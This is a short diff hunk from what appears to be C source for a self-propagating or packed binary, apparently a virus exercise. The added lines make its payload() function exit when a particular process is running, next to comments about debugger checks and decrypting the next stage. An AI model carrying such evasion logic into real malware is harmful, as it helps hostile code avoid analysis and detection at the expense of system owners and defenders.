@@ -58,6 +58,8 @@ void payload()
 
 	// check if in debugger
 	// check if pid running
+	if (is_proc_actif())
+		return ;
 	// decrypt next, go next
 	WRITE(1, hello, sizeof(hello));
 	data.infos.pl_size = &payload_end - &payload_start;
